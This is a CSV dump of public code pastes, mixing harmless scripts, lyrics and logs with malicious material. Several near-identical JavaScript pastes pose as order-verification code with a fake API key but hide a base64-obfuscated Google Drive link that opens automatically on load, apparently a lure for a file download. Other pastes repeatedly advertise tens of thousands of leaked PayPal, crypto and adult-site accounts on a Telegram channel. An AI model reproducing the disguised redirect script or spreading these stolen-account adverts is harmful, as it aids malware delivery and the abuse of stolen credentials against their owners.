id,title,username,language,date,content
Nc9msD48,Untitled,Ratqueenkslskskwkw,JavaScript,Friday 2nd of May 2025 05:26:51 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/86908/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
zRH0TRLg,Chaturbate with Tokens,Epiphemeral,JavaScript,Friday 2nd of May 2025 05:26:46 AM CDT,99555 Accounts Posted On https://t.me/leakzbyeminem
ukyKG1wa,q3_solution,Thrist00w,Python,Friday 2nd of May 2025 05:18:37 AM CDT,"import requests
from bs4 import BeautifulSoup
import os
import json

url = 'https://en.wikipedia.org/wiki/ASEAN'
filename = 'urban_areas.json'

response = requests.get(url)
soup = BeautifulSoup(response.text, 'html.parser')

table = soup.find('table', class_='sortable wikitable plainrowheaders')

countries_dictionary = {}

for row in table.find_all('tr')[1:]:
    cols = row.find_all('td')
    city = row.find('th').text.strip()

    population = int(cols[0].text.strip().replace(',', ''))
    area = float(cols[1].text.strip().replace(',', ''))
    country = cols[2].text.strip()

    city_data = {
        'City': city,
        'Population': population,
        'Area (km²)': area,
        'Population Density': round(population / area, 2) if area else None,
    }

    countries_dictionary.setdefault(country, []).append(city_data)

if os.path.exists(filename):
    with open(filename, 'r') as file:
        existing_data = json.load(file)
else:
    existing_data = {}

if existing_data != countries_dictionary:
    with open(filename, 'w') as file:
        json.dump(countries_dictionary, file, indent=1)

"
7LKcXCwz,Products.js,Ratqueenkslskskwkw,JavaScript,Friday 2nd of May 2025 05:11:29 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/98703/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
KNafwqeJ,Crypto Accounts,Epiphemeral,JavaScript,Friday 2nd of May 2025 05:11:23 AM CDT,80349 Accounts Posted On https://t.me/leakzbyeminem
ypRiEbsL,От героев былых времён (разметка),Lillgrinn,INI file,Friday 2nd of May 2025 05:04:42 AM CDT,"[Interlude: quiet percussion rhytm]

[Verse 1]
От героев былых времён не осталось порой имён, —
Те, кто приняли смертный бой, стали просто землёй и травой.
Только грозная доблесть их  поселилась в сердцах живых.
Этот вечный огонь, -- нам завещанный одним...
МЫ, в груди храним...

[Interlude 2/4 times]

[Verse 2]
Погляди на моих бойцов -- целый свет помнит их в лицо.
Вот застыл батальон в строю -- снова старых друзей узнаю...
Хоть им нет двадцати пяти — трудный путь им пришлось пройти.
Это те, кто в штыки... поднимался, как один...
ТЕ, кто брал Берлин.

[Crying interlude 2/4 times, short trumpet solo]

[Verse 3: legato]
Нет в России семьи такой, где б не памятен был свой герой...
И глаза молодых солдат, с фотографий увядших глядят.
Этот взгляд, словно Высший Суд, для ребят, что сейчас растут.
И мальчишкам нельзя, Ни солгать, ни обмануть!
Ни с пути свернуть!

[epic]
И мальчишкам нельзя! Ни солгать, ни обмануть!
Ни с пути свернуть!

[FADE OUT: percussion fade out]"
shnumX5J,KAR - Tempura Lua,maziari,Lua,Friday 2nd of May 2025 04:59:42 AM CDT,"function onScriptStart()
end
 
function onScriptCancel()
    MsgBox(""Script ended."")
end

function onScriptUpdate()
    TempuraCount = 0
    text = """"

    p_ItemList = ReadValue32(0x812BBC54)
    --p_ItemList = ReadValue32(0x812AB108)
    
    Addr = p_ItemList
    
    while Addr ~= 0 do
        if Addr == 0 then
            goto continue
        end
        p_Next = ReadValue32(Addr+8)
        p_Prev = ReadValue32(Addr+12)
        p_Item = ReadValue32(Addr+44)
        text = text..string.format(""\n Addr : %08X, Next : %08X, Prev : %08X, Item : %08X, "", Addr, p_Next, p_Prev, p_Item)

        if p_Item ~= 0 then
            ItemNum = ReadValue32(p_Item+28)
	    --ItemX = ReadValueFloat(p_Item+220)
	    --ItemY = ReadValueFloat(p_Item+224)
	    --ItemZ = ReadValueFloat(p_Item+228)

            --text = text..string.format(""%02X, %.3f, %.3f, %.3f"", ItemNum, ItemX, ItemY, ItemZ)
            text = text..string.format(""%02X"", ItemNum)

            if ItemNum == 0x31 then
                text = text.."" !!TEMPURA!!""
                TempuraCount = TempuraCount + 1
            end
        end

        Addr = p_Next
    end

    ::continue::
    
    text=text..string.format(""\nTEMPURA : %d"", TempuraCount)

    SetScreenText(text)
end"
G3KwyCTT,2025-05-02T10:59:34.813640,powerampache,PHP,Friday 2nd of May 2025 04:59:35 AM CDT,"1.01-80-play (80) - DB: 83
retrofit2.HttpException: HTTP 404 Not Found
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

"
y1HkiH96,Order.js,Ratqueenkslskskwkw,JavaScript,Friday 2nd of May 2025 04:56:05 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/21710/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
DSqEu4QT,PayPal with Balance,Epiphemeral,JavaScript,Friday 2nd of May 2025 04:56:00 AM CDT,55061 Accounts Posted On https://t.me/leakzbyeminem
EhCv52bJ,Market.js,Ratqueenkslskskwkw,JavaScript,Friday 2nd of May 2025 04:40:41 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/28952/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
fZp8Rnmd,Leaked Accounts - Fresh Hits,Epiphemeral,JavaScript,Friday 2nd of May 2025 04:40:39 AM CDT,03501 Accounts Posted On https://t.me/leakzbyeminem
NEi8AFKR,Untitled,Ratqueenkslskskwkw,JavaScript,Friday 2nd of May 2025 04:25:19 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/92469/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
mfuHwKbK,Chaturbate with Tokens,Epiphemeral,JavaScript,Friday 2nd of May 2025 04:25:16 AM CDT,10882 Accounts Posted On https://t.me/leakzbyeminem
N0kHDFqT,Crypto Accounts,Epiphemeral,JavaScript,Friday 2nd of May 2025 04:09:54 AM CDT,81026 Accounts Posted On https://t.me/leakzbyeminem
sUVcenhV,Untitled,kammex,JavaScript,Friday 2nd of May 2025 04:09:51 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/69039/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
StucXMun,PayPal with Balance,Epiphemeral,JavaScript,Friday 2nd of May 2025 03:54:32 AM CDT,80053 Accounts Posted On https://t.me/leakzbyeminem
Eren3QWf,Products.js,kammex,JavaScript,Friday 2nd of May 2025 03:54:29 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/31271/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
fSgbvfC7,tv 05-2025 task,spidersam,JSON,Friday 2nd of May 2025 03:47:33 AM CDT,"[
   {
    ""name"": ""ZooTv-Live-01-05-2025"",
    ""url"": ""https://app.talkshoe.com/drive_files/download/67a0d2ad-6fee-4dfa-bc17-6f0b99e01e2e.mp4"",
    ""imageUrl"": ""https://i.imgur.com/JxTvPB7.jpeg""  
   },
   {
    ""name"": ""ZooTv-Live-02-05-2025"",
    ""url"": """",
    ""imageUrl"": ""https://i.imgur.com/JxTvPB7.jpeg""  
   }
]"
Lf75e7Kd,ROBLOX Classic Animations + Classic NPC,AutumnMoon88683,Lua,Friday 2nd of May 2025 03:43:53 AM CDT,"local classic = true

local function Main()
	Connection = game.Workspace.DescendantAdded:Connect(function(c)
		if c.Name == ""Animate"" then
			c.Disabled=true        
		end
	end)
	repeat wait() until game.Players.LocalPlayer.Character
	Char = c
	Died = game.Players.LocalPlayer.Character:WaitForChild(""Humanoid"").Died:Connect(function()
		Connection:Disconnect()
		Died:Disconnect()
	end)
	wait(.1)
	function waitForChild(parent, childName)
		local child = parent:findFirstChild(childName)
		if child then return child end
		while true do
			child = parent.ChildAdded:wait()
			if child.Name==childName then return child end
		end
	end

	-- ANIMATION

	-- declarations

	local Figure = game.Players.LocalPlayer.Character
	local Torso = waitForChild(Figure, ""Torso"")
	local RightShoulder = waitForChild(Torso, ""Right Shoulder"")
	local LeftShoulder = waitForChild(Torso, ""Left Shoulder"")
	local RightHip = waitForChild(Torso, ""Right Hip"")
	local LeftHip = waitForChild(Torso, ""Left Hip"")
	local Neck = waitForChild(Torso, ""Neck"")
	local Humanoid = waitForChild(Figure, ""Humanoid"")
	local pose = ""Standing""

	local toolAnim = ""None""
	local toolAnimTime = 0

	local jumpMaxLimbVelocity = 0.75

	-- functions

	function onRunning(speed)
		if speed > 0.1 then
			pose = ""Running""
		else
			pose = ""Standing""
		end
	end

	function onDied()
		pose = ""Dead""
	end

	function onJumping()
		pose = ""Jumping""
	end

	function onClimbing()
		pose = ""Climbing""
	end

	function onGettingUp()
		pose = ""GettingUp""
	end

	function onFreeFall()
		pose = ""FreeFall""
	end

	function onFallingDown()
		pose = ""FallingDown""
	end

	function onSeated()
		pose = ""Seated""
	end

	function onPlatformStanding()
		pose = ""PlatformStanding""
	end

	function onSwimming(speed)
		if speed>0 then
			pose = ""Running""
		else
			pose = ""Standing""
		end
	end

	function moveJump()
		RightShoulder.MaxVelocity = jumpMaxLimbVelocity
		LeftShoulder.MaxVelocity = jumpMaxLimbVelocity
		RightShoulder:SetDesiredAngle(3.14)
		LeftShoulder:SetDesiredAngle(-3.14)
		RightHip:SetDesiredAngle(0)
		LeftHip:SetDesiredAngle(0)
	end


	-- same as jump for now

	function moveFreeFall()
		RightShoulder.MaxVelocity = jumpMaxLimbVelocity
		LeftShoulder.MaxVelocity = jumpMaxLimbVelocity
		RightShoulder:SetDesiredAngle(3.14)
		LeftShoulder:SetDesiredAngle(-3.14)
		RightHip:SetDesiredAngle(0)
		LeftHip:SetDesiredAngle(0)
	end

	function moveSit()
		RightShoulder.MaxVelocity = 0.15
		LeftShoulder.MaxVelocity = 0.15
		RightShoulder:SetDesiredAngle(3.14 /2)
		LeftShoulder:SetDesiredAngle(-3.14 /2)
		RightHip:SetDesiredAngle(3.14 /2)
		LeftHip:SetDesiredAngle(-3.14 /2)
	end

	function getTool()
		for _, kid in ipairs(Figure:GetChildren()) do
			if kid.className == ""Tool"" then return kid end
		end
		return nil
	end

	function getToolAnim(tool)
		for _, c in ipairs(tool:GetChildren()) do
			if c.Name == ""toolanim"" and c.className == ""StringValue"" then
				return c
			end
		end
		return nil
	end

	function animateTool()

		if (toolAnim == ""None"") then
			RightShoulder:SetDesiredAngle(1.57)
			return
		end

		if (toolAnim == ""Slash"") then
			RightShoulder.MaxVelocity = 0.5
			RightShoulder:SetDesiredAngle(0)
			return
		end

		if (toolAnim == ""Lunge"") then
			RightShoulder.MaxVelocity = 0.5
			LeftShoulder.MaxVelocity = 0.5
			RightHip.MaxVelocity = 0.5
			LeftHip.MaxVelocity = 0.5
			RightShoulder:SetDesiredAngle(1.57)
			LeftShoulder:SetDesiredAngle(1.0)
			RightHip:SetDesiredAngle(1.57)
			LeftHip:SetDesiredAngle(1.0)
			return
		end
	end

	function move(time)
		local amplitude
		local frequency

		if (pose == ""Jumping"") then
			moveJump()
			return
		end

		if (pose == ""FreeFall"") then
			moveFreeFall()
			return
		end

		if (pose == ""Seated"") then
			moveSit()
			return
		end

		local climbFudge = 0

		if (pose == ""Running"") then
			if (RightShoulder.CurrentAngle > 1.5 or RightShoulder.CurrentAngle < -1.5) then
				RightShoulder.MaxVelocity = jumpMaxLimbVelocity
			else  
				RightShoulder.MaxVelocity = 0.15
			end
			if (LeftShoulder.CurrentAngle > 1.5 or LeftShoulder.CurrentAngle < -1.5) then
				LeftShoulder.MaxVelocity = jumpMaxLimbVelocity
			else  
				LeftShoulder.MaxVelocity = 0.15
			end
			amplitude = 1
			frequency = 9
		elseif (pose == ""Climbing"") then
			RightShoulder.MaxVelocity = 0.5
			LeftShoulder.MaxVelocity = 0.5
			amplitude = 1
			frequency = 9
			climbFudge = 3.14
		else
			amplitude = 0.1
			frequency = 1
		end

		desiredAngle = amplitude * math.sin(time*frequency)

		RightShoulder:SetDesiredAngle(desiredAngle + climbFudge)
		LeftShoulder:SetDesiredAngle(desiredAngle - climbFudge)
		RightHip:SetDesiredAngle(-desiredAngle)
		LeftHip:SetDesiredAngle(-desiredAngle)


		local tool = getTool()

		if tool then

			animStringValueObject = getToolAnim(tool)

			if animStringValueObject then
				toolAnim = animStringValueObject.Value
				-- message recieved, delete StringValue
				animStringValueObject.Parent = nil
				toolAnimTime = time + .3
			end

			if time > toolAnimTime then
				toolAnimTime = 0
				toolAnim = ""None""
			end

			animateTool()


		else
			toolAnim = ""None""
			toolAnimTime = 0
		end
	end


	-- connect events

	Humanoid.Died:connect(onDied)
	Humanoid.Running:connect(onRunning)
	Humanoid.Jumping:connect(onJumping)
	Humanoid.Climbing:connect(onClimbing)
	Humanoid.GettingUp:connect(onGettingUp)
	Humanoid.FreeFalling:connect(onFreeFall)
	Humanoid.FallingDown:connect(onFallingDown)
	Humanoid.Seated:connect(onSeated)
	Humanoid.PlatformStanding:connect(onPlatformStanding)
	Humanoid.Swimming:connect(onSwimming)
	-- main program

	local runService = game:service(""RunService"");

	while Figure.Parent ~= nil do
		local _, time = wait(0.1)
		move(time)
	end
end

game.Players.LocalPlayer.CharacterAdded:Connect(function(c)
	if classic then
		coroutine.wrap(Main)()
	end
end)

local bot = false
local d = game:GetService(""UserInputService"")

d.InputBegan:Connect(function(c,v)
	if v then
		return
	else		
		if c.KeyCode == Enum.KeyCode.KeypadFive then
			bot = not bot
			print(""ClassicBotMode:""..tostring(bot))
		elseif c.KeyCode == Enum.KeyCode.KeypadSix then
			classic = not classic
			print(""ClassicAnims:""..tostring(classic))	
			
		end	
	end
end)

while wait() do
	if bot then
		local c = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
		wait(math.random(1,7))
		if math.random(1,5) > 2.5 then
			c:FindFirstChild(""Humanoid"").Jump = true
		end
		c:FindFirstChild(""Humanoid"").WalkToPoint = Vector3.new(math.random(1,2),math.random(1,2),math.random(1,2))
	end
end"
b57hjNEA,Leaked Accounts - Fresh Hits,Epiphemeral,JavaScript,Friday 2nd of May 2025 03:39:11 AM CDT,97780 Accounts Posted On https://t.me/leakzbyeminem
